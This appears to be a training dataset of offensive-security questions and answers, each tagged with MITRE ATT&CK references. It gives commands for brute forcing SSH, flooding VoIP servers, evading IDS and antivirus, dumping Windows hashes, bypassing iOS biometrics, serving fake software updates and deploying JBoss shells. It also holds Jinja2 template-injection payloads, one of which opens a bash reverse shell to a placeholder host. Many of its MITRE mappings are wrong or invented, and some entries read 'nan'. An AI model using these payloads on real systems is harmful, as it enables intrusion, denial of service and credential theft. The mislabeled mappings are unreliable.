## Q: How can I use hakrawler to perform reconnaissance on a target organization?
A: Hakrawler version 2.1 can be used to perform reconnaissance on a target organization by crawling their website and gathering information. For example, to crawl the website example.com, follow external links, and output the results in JSON format, you can run:

hakrawler -u https://example.com -json -subs -d 3

This will crawl up to 3 levels deep on the example.com domain and any subdomains, and output the results as JSON. You can then review the URLs, JavaScript files, and other information gathered to identify potential attack vectors, sensitive data, or other intelligence that could be useful for further penetration testing. MITRE References: MITRE ID is T1595, MITRE Name is: Active Scanning, and MITRE Tactics are: Discovery.

## Q: How can you use hamster-sidejack to hijack a user's session?
A: To use hamster-sidejack to hijack a user's session, follow these steps:

1. Run the hamster command to start the proxy server listening on 127.0.0.1:1234.
2. Configure your browser to use the proxy at 127.0.0.1:1234.
3. Browse to a website as the target user and let hamster capture their session cookies.
4. Once the cookies are captured, you can use them to access the target user's session on the website. MITRE References: MITRE ID is T1556, MITRE Name is: Modify Authentication Process, and MITRE Tactics are: TA0006.

## Q: What are some useful Havoc commands for collecting information about a compromised system?
A: Havoc provides several commands to gather information about a compromised system, such as 'sysinfo' to retrieve system details, 'enum_users' to list users, and 'enum_processes' to list running processes. You can also use 'enum_services' to list installed services and 'enum_drives' to list available storage volumes. These commands can help you understand the target environment and identify potential avenues for further exploitation. MITRE References: MITRE ID is T1082, MITRE Name is: System Information Discovery, and MITRE Tactics are: Discovery.

## Q: How can Havoc be used to establish persistent access to a compromised system?
A: Havoc supports various persistence mechanisms, including creating scheduled tasks, modifying registry keys, and installing malicious services. For example, you can use the 'persistence' command to create a scheduled task that will execute the Havoc agent on system startup. Additionally, the 'install_service' command can be used to install a malicious service that will run the Havoc agent. These persistence techniques can help you maintain access to the compromised system even after the initial entry point is closed. MITRE References: MITRE ID is T1543, MITRE Name is: Create or Modify System Process, and MITRE Tactics are: Persistence.

## Q: How can heartleech be used to exploit the Heartbleed vulnerability and retrieve private keys?
A: Heartleech can be used to automatically retrieve private keys from systems vulnerable to the Heartbleed OpenSSL bug. After scanning for vulnerable systems, heartleech can then be used to download the heartbleed data in bulk and process it offline to extract any private keys that may have been exposed. The tool supports features to aid in this process, such as the ability to use multiple threads for faster downloads. MITRE References: MITRE ID is T1133, MITRE Name is: External Remote Services, and MITRE Tactics are: Initial Access.

## Q: How can hostapd-wpe be used to obtain credentials from wireless clients?
A: hostapd-wpe is a modified version of the hostapd wireless access point (AP) software that can be used to impersonate a legitimate wireless AP and capture client credentials. It supports several EAP types, including EAP-FAST/MSCHAPv2, PEAP/MSCHAPv2, and EAP-TTLS/MSCHAPv2. When a client connects, hostapd-wpe will return an EAP-Success message, allowing it to establish connectivity with the client and capture the authentication credentials. Additionally, hostapd-wpe implements Karma-style gratuitous probe responses and Heartbleed attacks against vulnerable clients. The captured credentials can then be cracked offline using a tool like asleap. MITRE References: MITRE ID is T1556.004, MITRE Name is: Dynamic Access Control, and MITRE Tactics are: TA0006.

## Q: How can hotpatch be used to bypass security controls during a penetration test?
A: The hotpatch tool can be used to dynamically load a shared library (`.so` file) into a running process, which can be leveraged to bypass security controls during a penetration test. This technique is known as process injection and can be used to execute arbitrary code within the context of the target process, potentially bypassing security measures.

For example, you could use hotpatch to load a library that disables logging or monitoring mechanisms, allowing you to perform further malicious actions without detection. The specific use case would depend on the target environment and the security controls in place.

Usage example (version 0.2-1kali4):

```  hotpatcher -l /path/to/bypass.so <PID of target process>  ```

Note that the use of hotpatch for malicious purposes should only be done with proper authorization and in the scope of a legitimate security assessment. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can hping3 be used to perform TCP sequence number prediction and TCP session hijacking?
A: To perform TCP sequence number prediction and session hijacking using hping3 version 3.a2.ds2-10, you can use the following commands:

1. Use hping3 to capture the initial TCP sequence number of an existing TCP session:
hping3 -S -p <destination_port> -M <initial_seq_num> <target_host>

2. Use hping3 to inject packets into the existing TCP session with the predicted sequence number:
hping3 -a <source_ip> -p <destination_port> -M <predicted_seq_num> -A -S <target_host>

This can be used to hijack an existing TCP session and potentially gain unauthorized access to the target system. MITRE References: MITRE ID is T1090, MITRE Name is: Connection Proxy, and MITRE Tactics are: Command and Control.

## Q: How can you use htshells to execute commands remotely on a web server?
A: The htshells tool includes an attack module called 'mod_sendmail.rce.htaccess' that can be used to execute remote commands on a web server. To use this, you would create a .htaccess file containing the rce.htaccess code and place it in a directory on the target web server. This will allow you to execute arbitrary commands on the server by sending requests to the .htaccess file. The version of htshells used is 0.1~git20131205-1kali3. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you use htshells to steal information from a web server?
A: The htshells tool includes an attack module called 'mod_auth_remote.phish.htaccess' that can be used to steal information from a web server. To use this, you would create a .htaccess file containing the phish.htaccess code and place it in a directory on the target web server. This will allow you to collect authentication credentials entered by users accessing the web server. The version of htshells used is 0.1~git20131205-1kali3. MITRE References: MITRE ID is T1552, MITRE Name is: Unsecured Credentials, and MITRE Tactics are: Credential Access.

## Q: How can an attacker exploit the 'First-request Routing' vulnerability in front-end servers?
A: Attackers can exploit the 'First-request Routing' vulnerability by sending two requests through the same connection, where the first request determines the back-end routing for all subsequent requests. This can be demonstrated with the following HTTP requests:

```GET / HTTP/1.1
Host: example.com

POST /pwreset HTTP/1.1
Host: psres.net```
The front-end server may use the Host header of the first request to determine the back-end routing, and then persistently route all subsequent requests from the same client connection to the same back-end connection. This can be combined with other vulnerabilities, such as host header attacks, to gain unauthorized access to additional virtual hosts. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can HTTP Request Smuggling be used to capture other users' requests?
A: By appending a specific request as the value of a parameter during a POST operation, it is possible to store the subsequent client's request. This can be done by leveraging either a CL.TE or TE.CL vulnerability, where the smuggled request is added as the value of a parameter, allowing the attacker to capture the next user's request. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: TA0005.

## Q: How can you use multiple nested injections in an HTTP Response Smuggling attack?
A: In a HTTP Response smuggling attack, as you are sending full requests, you can inject in one payload tens of responses that will be desynchronising tens of users that will be receiving the injected responses. Apart from being able to distribute more easily tens of exploits across legitimate users, this could also be used to cause a DoS in the server. MITRE References: MITRE ID is T1568, MITRE Name is: Dynamic Resolution Offices, and MITRE Tactics are: TA0011.

## Q: How can you capture other users' requests in an HTTP Response Smuggling attack?
A: To capture other users' requests, the attacker can send a payload containing a final POST request with the reflected parameter at the end and a large Content-Length. Then, once the initial request is processed and while the time-consuming request is being processed, the next request that arrives from a victim is going to be appended in the queue just after the reflected parameter. The victim will then receive the response to the time-consuming request, and if the attacker sent another request, the response from the reflected content request will be sent to the attacker. MITRE References: MITRE ID is T1071.001, MITRE Name is: Application Layer Protocol: Web Protocols, and MITRE Tactics are: TA0009, TA0010.

## Q: How can you perform a Response Desynchronisation attack using a HEAD request?
A: To perform a Response Desynchronisation attack, the attacker can inject a HEAD request, which is specified to not have any content inside the responses body but must contain the Content-Length of the request like if it was a GET request. Once the initial HEAD request is responded to the attacker, the next victim's request is going to be introduced in the queue. The victim will then receive the response from the HEAD request, which is going to contain a Content-Length but no content at all. The proxy won't send this response to the victim, but will wait for some content, which actually is going to be the response to the attacker's injected request. MITRE References: MITRE ID is T1071.001, MITRE Name is: Application Layer Protocol: Web Protocols, and MITRE Tactics are: TA0009, TA0010.

## Q: How can you perform a Content Confusion attack in an HTTP Response Smuggling attack?
A: To perform a Content Confusion attack, the attacker can send a request that controls the body of the request whose response is going to be received by the victim, and then include a HEAD request that usually contains in its headers the Content-Type and the Content-Length. This can be used to cause XSS in the victim without the page being vulnerable to XSS. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: TA0009, TA0010.

## Q: How can you perform a Web Cache Deception attack using an HTTP Response Smuggling vulnerability?
A: To perform a Web Cache Deception attack, the attacker can abuse the Response Desynchronisation to cache victim information inside the cache. The attacker will find an endpoint of the web application that is reflecting some values inside the response and know the content length of the HEAD response, then send an exploit to make the proxy send a 100% attacker-generated response that will be cached. MITRE References: MITRE ID is T1530, MITRE Name is: Data from Cloud Storage Object, and MITRE Tactics are: TA0009, TA0010.

## Q: How can you perform a Response Splitting attack using an HTTP Response Smuggling vulnerability?
A: To perform a Response Splitting attack, the attacker needs to find an endpoint of the web application that is reflecting some values inside the response and know the content length of the HEAD response. The attacker will then send an exploit that includes a HEAD request and a second request with a payload. After the first request is resolved and sent back to the attacker, the victim's request is added into the queue. The victim will receive the HEAD response + the content of the second request response (containing part of the reflected data), and the next request of the second victim will be receiving as response something completely crafted by the attacker, which the attacker can also make the proxy cache. MITRE References: MITRE ID is T1055.012, MITRE Name is: Process Injection: Process Hollowing, and MITRE Tactics are: TA0009, TA0010.

## Q: How can hydra v9.5 be used to perform a password brute-force attack against an SSH server?
A: To perform a password brute-force attack against an SSH server using hydra v9.5, you can use the following command:hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 ssh://192.168.1.123This will attempt to login as the 'root' user using a password list located at '/usr/share/wordlists/metasploit/unix_passwords.txt' with 6 concurrent threads against the SSH server at '192.168.1.123'. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can Hyperion be used to obfuscate a Windows executable and evade security controls?
A: Hyperion is a runtime encrypter for 32-bit Windows executables that can be used to obfuscate and encrypt a program to evade detection by security controls. Version 2.0 is used as an example. To use Hyperion, provide the input executable as an argument and it will encrypt the file with AES-128. The encrypted executable will decrypt itself at runtime, but the decryption process may take a few seconds. Hyperion generates a log file for debugging purposes. MITRE References: MITRE ID is T1027, MITRE Name is: Obfuscated Files or Information, and MITRE Tactics are: Defense Evasion.

## Q: How can I use iaxflood to flood a VoIP server with malicious packets?
A: To flood a VoIP server with malicious IAX packets using iaxflood version 0.1-1kali3, run the following command:

```console
root@kali:~# iaxflood 192.168.1.202 192.168.1.1 500
```

This will flood the server at IP address `192.168.1.1` from the source IP `192.168.1.202` by sending 500 malformed IAX packets. This can be used to overwhelm and potentially crash the target VoIP server. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: What are some of the key post-exploitation features available in ibombshell?
A: ibombshell provides a wide range of post-exploitation features that can be loaded directly into memory, including remote command execution, file transfer, screenshot capture, keylogging, and more. The 'everywhere' execution mode allows these functions to be executed without needing to install any components on the target system. Version 0~git20201107-0kali2. MITRE References: MITRE ID is T1106, MITRE Name is: execution, and MITRE Tactics are: Execution, Lateral Movement, Collection.

## Q: How can Flipper Zero be used to attack iButtons?
A: iButtons can be attacked with Flipper Zero. Flipper can work both in Master and Slave modes. In the key reading mode, Flipper acts as a reader this is to say it works as a Master. And in the key emulation mode, the flipper pretends to be a key, it is in the Slave mode. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: nan.

## Q: How can ident-user-enum be used to perform user enumeration on a target system?
A: ident-user-enum v1.0 can be used to query the ident service (113/TCP) on a target system to determine the OS-level user running the process listening on a given TCP port. This can help to prioritize targets during a penetration test, as you may want to attack services running as root first. The tool can be used by running the following command: "ident-user-enum <target_ip> <port1> <port2> ..." to enumerate the users associated with the specified ports. MITRE References: MITRE ID is T1087, MITRE Name is: Account Discovery, and MITRE Tactics are: Discovery.

## Q: How can ident-user-enum be used to gather usernames for password guessing attacks?
A: The list of usernames gathered using ident-user-enum v1.0 can be used for password guessing attacks on other network services. By querying the ident service (113/TCP) to determine the OS-level users running processes on the target system, an attacker can compile a list of potential usernames to use in brute-force or dictionary attacks against other services on the network. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: What online tools can be used to identify and crack password hashes?
A: ### Using Online Tools

#### findmyhash

You can use findmyhash 

Here is an example of how to use it:

```
findmyhash LM -h 6c3d4c343f999422aad3b435b51404ee:bcd477bfdb45435a34c6a38403ca4364
```

### Cracking

Crackstation
<https://crackstation.net/>

Hashkiller
<https://hashkiller.co.uk/>

Google hashes
Search pastebin. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can you extract password hashes from Windows systems?
A: ## Windows

If you find a local file inclusion vulnerability you might be able to retrieve two fundamental files from it. the `system` registry and the `SAM` registry. There two files/registries are all we need to get the machines hashes.
These files can be found in several different locations in windows. Here they are:

```
Systemroot can be windows
%SYSTEMROOT%\repair\SAM
windows\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM

System file can be found here
SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\RegBack\system
```

So if the manage to get your hands on both of these files you can extract the password hashed like this:

```
pwdump system sam
``` MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How can you avoid IDS/IPS signatures?
A: Just add garbage data to the packets so the IPS/IDS signature is avoided.

Nmap option: `--data-length 25` MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Defense Evasion, and MITRE Tactics are: Defense Evasion.

## Q: How can you bypass IDS/IPS by using fragmented packets?
A: Just fragment the packets and send them. If the IDS/IPS doesn't have the ability to reassemble them, they will arrive to the final host.

Nmap option: `-f` MITRE References: MITRE ID is T1700, MITRE Name is: Airborne Packet Sniffing, and MITRE Tactics are: Reconnaissance.

## Q: How can you bypass IDS/IPS by sending packets with invalid checksum?
A: Sensors usually don't calculate checksum for performance reasons. So an attacker can send a packet that will be interpreted by the sensor but rejected by the final host. Example:

Send a packet with the flag RST and a invalid checksum, so then, the IPS/IDS may thing that this packet is going to close the connection, but the final host will discard the packet as the checksum is invalid. MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Defense Evasion, and MITRE Tactics are: Defense Evasion.

## Q: How can you bypass IDS/IPS using overlapping packets?
A: It is possible that when you fragment a packet, some kind of overlapping exists between packets (maybe first 8 bytes of packet 2 overlaps with last 8 bytes of packet 1, and 8 last bytes of packet 2 overlaps with first 8 bytes of packet 3). Then, if the IDS/IPS reassembles them in a different way than the final host, a different packet will be interpreted.

OS Behavior:
* **BSD**: It has preference for packets with smaller *offset*. For packets with same offset, it will choose the first one.
* **Linux**: Like BSD, but it prefers the last packet with the same offset.
* **First** (Windows): First value that comes, value that stays.
* **Last** (cisco): Last value that comes, value that stays. MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Defense Evasion, and MITRE Tactics are: Defense Evasion.

## Q: How can ifenslave (v2.14) be used to bypass network security controls in a penetration test?
A: Ifenslave can be abused to bypass network security controls by creating a bonded network interface that appears as a single logical interface to the target network. This can be used to bypass firewall rules, IPS/IDS, and other security mechanisms that may be monitoring individual network interfaces. To do this, create a bonded interface using ifenslave and then route traffic through the bonded interface to obscure the individual slave interfaces. For example:

`sudo modprobe bonding`
`sudo ip link add bond0 type bond`
`sudo ip link set eth0 master bond0`
`sudo ip link set eth1 master bond0`
`sudo route add -net 0.0.0.0/0 dev bond0`

This creates a bonded interface 'bond0' and routes all traffic through it, potentially bypassing security controls that may be monitoring the individual 'eth0' and 'eth1' interfaces. Use with caution, as this technique may be considered malicious. MITRE References: MITRE ID is T1095, MITRE Name is: Network Impairment, and MITRE Tactics are: Defense Evasion, Lateral Movement.

## Q: How can you bypass a CSP that only allows inline scripts?
A: You can bypass a CSP that only allows inline scripts by:

1. Uploading a JS file to the server and loading it via an iframe, even with `script-src 'none'`.
2. Abusing a same-site JSONP endpoint to inject JavaScript. MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Defense Evasion, and MITRE Tactics are: TA0005.

## Q: How can you bypass authentication on an IIS server using the CVE-2022-30209 vulnerability?
A: A bug in the code **didn't properly check for the password given by the user**, so an attacker whose **password hash hits a key** that is already in the **cache** will be able to login as that user. You can use the provided script to check for this vulnerability. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can the psk-crack tool be used to crack IKE Aggressive Mode Pre-Shared Keys?
A: The psk-crack tool can be used to crack pre-shared keys (PSKs) used in IKE Aggressive Mode. To use psk-crack, first capture the IKE Aggressive Mode exchange using ike-scan with the --pskcrack option. This will generate a file containing the PSK parameters. Then, run psk-crack with the generated file:```# Crack the PSK using a dictionary attackroot@kali:~# psk-crack psk-params.txt# Crack the PSK using a brute-force attackroot@kali:~# psk-crack --bruteforce=8 psk-params.txt```psk-crack supports both standard PSK cracking as well as the proprietary method used by Nortel Contivity / VPN Router systems. It can handle both MD5 and SHA1-based hashes (version 1.9.5). MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can impacket-samrdump be used to dump user account information from a target system?
A: impacket-samrdump is a tool from the Impacket suite that can be used to dump user account information from a target system. This information can be useful in identifying valid user accounts and potential attack targets. To use impacket-samrdump, you can run the following command:

impacket-samrdump [[domain/]username[:password]@]<targetName or address>

This will connect to the target system and query the Security Accounts Manager (SAM) database to retrieve the list of user accounts. The output will show the username, user ID, and other account details.

MITRE_ID: T1069
MITRE_Name: Permission Groups Discovery
MITRE_Tactics: [Discovery] MITRE References: MITRE ID is T1069, MITRE Name is: Permission Groups Discovery, and MITRE Tactics are: Discovery.

## Q: How can you attack Infrared (IR) signals using Flipper Zero?
A: You can attack Infrared with Flipper Zero according to the information provided in the [pageFZ - Infrared](/todo/radio-hacking/flipper-zero/fz-infrared) page. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: nan.

## Q: How can InSpy be used to discover employee information from LinkedIn for a target company?
A: InSpy version 3.0.0 can be used to discover employee information from LinkedIn for a target company. To do this, run the following command:

```console
root@kali:~# inspy --empspy /usr/share/inspy/wordlists/title-list-large.txt google
```

This will use the provided wordlist of job titles to search LinkedIn for `google` employees. The results can be saved to various output formats like HTML, CSV, JSON, or XML using the corresponding command-line options. MITRE References: MITRE ID is T1589, MITRE Name is: Gather Victim Identity Information, and MITRE Tactics are: Information Gathering.

## Q: How can InSpy be used to discover technologies in use at a target company?
A: InSpy version 3.0.0 can be used to discover technologies in use at a target company. To do this, run the following command:

```console
root@kali:~# inspy --techspy /usr/share/inspy/wordlists/tech-list-small.txt cisco
```

This will use the provided list of technology terms to search LinkedIn for information about technologies in use at the `cisco` company. The results can be saved to various output formats like HTML, CSV, JSON, or XML using the corresponding command-line options. MITRE References: MITRE ID is T1595, MITRE Name is: Active Scanning, and MITRE Tactics are: Discovery.

## Q: How can instaloader be used for reconnaissance on a target's Instagram account?
A: Instaloader can be used to download a target's Instagram posts, stories, and other metadata. This can be useful for reconnaissance and gathering intelligence on a target. For example, to download all posts from a target's profile, you can use the command: 'instaloader <target_profile>'. This will create a directory with the target's profile name and download all their posts, including captions, comments, and other metadata. The --stories and --highlights options can also be used to download the target's stories and highlights. Version 4.10.3 was used. MITRE References: MITRE ID is T1593, MITRE Name is: Gather Victim Host Information, and MITRE Tactics are: TA0001.

## Q: How can instaloader be used to automate the monitoring of a target's Instagram activity?
A: Instaloader can be used to monitor a target's Instagram activity by automating the download of new posts, stories, and other updates. The --fast-update option can be used to only download new content since the last run, allowing you to efficiently update a local archive of the target's Instagram activity. Additionally, the --latest-stamps option can be used to store timestamps of the latest media scraped, making it easier to resume interrupted downloads or update the archive over time. Version 4.10.3 was used. MITRE References: MITRE ID is T1115, MITRE Name is: Automated Collection, and MITRE Tactics are: TA0009.

## Q: How can you escalate privileges if you are in the disk group?
A: The disk group gives you almost equivalent access to root, as you can access all the data inside the machine. You can use tools like debugfs to read sensitive files like /root/.ssh/id_rsa or /etc/shadow. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Privilege Escalation, Initial Access.

## Q: How can you escalate privileges if you are in the root group?
A: Members of the root group can potentially modify service configuration files, libraries, or other interesting files that could be used to escalate privileges. You can check which files root members can modify using `find / -group root -perm -g=w 2>/dev/null`. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Privilege Escalation.

## Q: How can you use intrace to perform network reconnaissance and firewall bypassing?
A: To perform network reconnaissance and firewall bypassing using intrace version 1.6, you can run the following command:

```root@kali:~# intrace -h www.example.com -p 80 -s 4```

This will send a trace to the target host www.example.com on port 80 using a packet size of 4 bytes. intrace can be used to enumerate IP hops and bypass firewalls by exploiting existing TCP connections, which can be useful for understanding network topology and potential attack vectors. MITRE References: MITRE ID is T1016, MITRE Name is: System Network Configuration Discovery, and MITRE Tactics are: Discovery.

## Q: What is the purpose of the inviteflood tool and how can it be used to perform SIP/SDP INVITE message flooding?
A: The inviteflood tool is a security tool designed to perform SIP/SDP INVITE message flooding over UDP/IP. It can be used to flood a target domain and IP address with a specified number of INVITE packets. The tool allows you to customize the source IP address, source port, destination port, and other parameters. Version 2.0 of inviteflood was released in June 2006. MITRE References: MITRE ID is T1498, MITRE Name is: Network Denial of Service, and MITRE Tactics are: Impact.

## Q: How can the inviteflood tool be used to perform a Denial of Service (DoS) attack against a SIP server?
A: To perform a DoS attack against a SIP server using inviteflood, you would run the tool with the following parameters:inviteflood eth0 5000 example.local 192.168.1.5 100This would flood the target domain 'example.local' and IP address '192.168.1.5' with 100 SIP INVITE packets using the 'eth0' interface and targeting the user '5000'. The tool allows you to customize the source IP, source port, and other settings to craft the attack. MITRE References: MITRE ID is T1498, MITRE Name is: Network Denial of Service, and MITRE Tactics are: Impact.

## Q: How can you bypass the Local Authentication framework on iOS?
A: To bypass the Local Authentication framework on iOS, you can use the Objection Biometrics Bypass feature. Run the following command in Objection:

```
ios ui biometrics_bypass
```
This will register a job that manipulates the `evaluatePolicy` function to always return success, effectively bypassing the biometric authentication check. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: TA0006.

## Q: How can you find sensitive information stored in the keychain of an iOS app?
A: To find sensitive information stored in the keychain of an iOS app, you can use the `ios keychain dump` command in Objection. This will dump the contents of the keychain, allowing you to inspect the stored data for any sensitive information. MITRE References: MITRE ID is T1555, MITRE Name is: Credentials from Password Stores, and MITRE Tactics are: TA0006.

## Q: How can you use backups to access and modify sensitive information in an iOS application?
A: Backups can be used to access sensitive information saved in the file system of an iOS application. Additionally, backups can be used to modify some configurations of the application, and then restore the modified backup on the device, which may bypass certain security functionality. MITRE References: MITRE ID is T1066, MITRE Name is: Indicator Removal on Host, and MITRE Tactics are: TA0005.

## Q: How can you bypass jailbreak detection in iOS apps?
A: You can try to avoid this detections using **objection's** `ios jailbreak disable`

You could also install the tool **Liberty Lite** (https://ryleyangus.com/repo/). Once the repo is added, the app should appear in the 'Search' tab MITRE References: MITRE ID is T1553, MITRE Name is: Subvert Trust Controls, and MITRE Tactics are: TA0005.

## Q: How can you capture the preshared key hash and crack it?
A: If you have found a valid transformation and the group name, and if the aggressive mode is allowed, you can capture the crackable hash using the following command:

```
ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP>
```
The hash will be saved inside `hash.txt`. You can then use tools like `psk-crack`, `john` (using `ikescan2john.py`), or `hashcat` to crack the hash. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can you brute-force the XAUTH username and password?
A: To brute-force the XAUTH (when you know a valid group name `id` and the `psk`), you can use `ikeforce.py` with a username or list of usernames and a list of passwords:

```
./ikeforce.py <IP> -b -i <group_id> -u <username> -k <PSK> -w <passwords.txt> [-s 1]
```
This way, `ikeforce` will try to connect using each combination of username:password. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can you use evilgrade to perform a Man-in-the-Middle (MITM) attack against a target?
A: evilgrade is a modular framework that allows you to take advantage of poor software update implementations and inject fake updates. You can use it to perform MITM attacks by configuring the built-in webserver and DNS server modules. For example, to attack the Skype software, you can run the following commands:

```console
root@kali:~# evilgrade
[DEBUG] - Loading module: modules/skype.pm
...
- 63 modules available.

evilgrade>config skype
evilgrade(skype)>start
[17/5/2014:12:52:11] - [WEBSERVER] - Webserver ready. Waiting for connections ...

evilgrade(skype)>  
[17/5/2014:12:52:11] - [DNSSERVER] - DNS Server Ready. Waiting for Connections ...
```

This sets up a webserver and DNS server to serve malicious Skype updates to the target. By redirecting the target's traffic through this, you can deliver a fake update and potentially execute arbitrary code on the system. MITRE References: MITRE ID is T1195, MITRE Name is: Supply Chain Compromise, and MITRE Tactics are: Initial Access, Execution.

## Q: What are some of the software targets that evilgrade supports for delivering malicious updates?
A: evilgrade version 2.0.9 supports a wide range of software targets for delivering malicious updates, including:

- Cygwin
- JetPhoto
- Intel Drivers
- iStat
- Google Analytics
- Sparkle (macOS updater)
- OpenBazaar
- APT (package manager)
- Tech Tracker
- QuickTime
- CCleaner
- Yahoo! Messenger
- ASUS Software
- AMSN
And many more - over 80 modules are available in total. This allows evilgrade to be used for targeted attacks against a variety of popular software on Windows, macOS, and other platforms. MITRE References: MITRE ID is T1195, MITRE Name is: Supply Chain Compromise, and MITRE Tactics are: Initial Access, Execution.

## Q: How can iw (version 5.19) be used to perform wireless denial-of-service attacks?
A: iw can be used to perform wireless denial-of-service attacks by disconnecting clients from the network. Some key commands include:

- `iw dev <devname> station del <MAC address> [subtype <subtype>] [reason-code <code>]`: Removes a station (client) from the network, effectively disconnecting them. The subtype and reason-code parameters can be used to specify the type of disconnect.
- `iw dev <devname> switch channel <channel> [NOHT|HT20|HT40+|HT40-|5MHz|10MHz|80MHz]`: Changes the channel of the wireless interface, which can disrupt clients. MITRE References: MITRE ID is T1499, MITRE Name is: Endpoint Denial of Service, and MITRE Tactics are: Impact.

## Q: What code can be used to try different guesses for a flag in an XS Leak vulnerability?
A: The code provided shows an example of how to try different guesses for a flag in an XS Leak vulnerability. The key elements are:

1. The `/guessing` route that generates an iframe with the current guess as the `src` parameter.
2. The main page that sets up a timer to continuously generate new iframes with updated guesses.
3. The `foo()` function that is called from the iframe if the guess is incorrect, which sets `candidateIsGood` to `false`.
4. The logic to iterate through possible flag characters and update the `candidate` string accordingly.
5. The fetching of the flag to a webhook URL once the correct flag is found. MITRE References: MITRE ID is T1204, MITRE Name is: User Execution, and MITRE Tactics are: Execution.

## Q: How can the jboss-autopwn tool be used to deploy a JSP shell on a target JBoss AS server?
A: The jboss-autopwn tool can be used to deploy a JSP shell on a target JBoss AS server. The tool supports multiplatform targets including Windows, Linux, and Mac. It can be used to establish a reverse bind shell or a Meterpreter shell on the target system. The tool uses upload and command execution capabilities to provide an interactive session. An example usage would be to run the 'jboss-linux' script against a target server at 192.168.1.200 on port 8080, redirecting stderr to /dev/null: jboss-linux 192.168.1.200 8080 2> /dev/null MITRE References: MITRE ID is T1505, MITRE Name is: Server Software Component, and MITRE Tactics are: Persistence, Privilege Escalation, Remote Access.

## Q: How can the jboss-autopwn tool be used to gain access to a Windows target system through a Meterpreter shell?
A: The jboss-autopwn tool supports deploying Meterpreter shells on Windows targets. After deploying the JSP shell on the JBoss server, the tool can be used to establish a Meterpreter session and provide interactive access to the Windows system. This allows for further post-exploitation activities such as privilege escalation, data exfiltration, and lateral movement within the target environment. MITRE References: MITRE ID is T1505, MITRE Name is: Server Software Component, and MITRE Tactics are: Persistence, Privilege Escalation, Remote Access.

## Q: How can Google Dorks be used to find vulnerable JBOSS servers?
A: Google Dorking can aid in identifying vulnerable servers with a query like: `inurl:status EJInvokerServlet` MITRE References: MITRE ID is T1593.002, MITRE Name is: Search Open Websites/Domains: Search Engines, and MITRE Tactics are: Discovery.

## Q: How can you access global objects in a Jinja2 SSTI vulnerability?
A: You can access global objects in a Jinja2 SSTI vulnerability by using objects that come from the non-sandboxed Python environment, such as `request`, `config`, `dict`, etc. These objects will be accessible inside the sandboxed environment. You can then use these objects to try to recover the `<class 'object'>` class and call its `__subclasses__()` method to access other classes that may allow you to read/write files or execute commands. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Privilege Escalation, Defense Evasion.

## Q: How can you dump all the config variables in a Jinja2 SSTI vulnerability?
A: You can dump all the config variables in a Jinja2 SSTI vulnerability by using the following code:

```
{{ config }} #In these object you can find all the configured env variables


{% for key, value in config.items() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}
``` MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: How can you achieve RCE in a Jinja2 SSTI vulnerability by writing an evil config file?
A: You can achieve RCE in a Jinja2 SSTI vulnerability by writing an evil config file, like this:

```
# evil config
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} 

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
``` MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you achieve RCE in a Jinja2 SSTI vulnerability without using the `<class 'object'>` class?
A: You can achieve RCE in a Jinja2 SSTI vulnerability without using the `<class 'object'>` class by finding functions from the global objects `request`, `config`, and other interesting global objects, and then using those functions to access `__globals__.__builtins__` to execute commands. For example:

```
# Read file
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}

# RCE
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
``` MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you exploit the Log4Shell vulnerability using the Marshalsec tool?
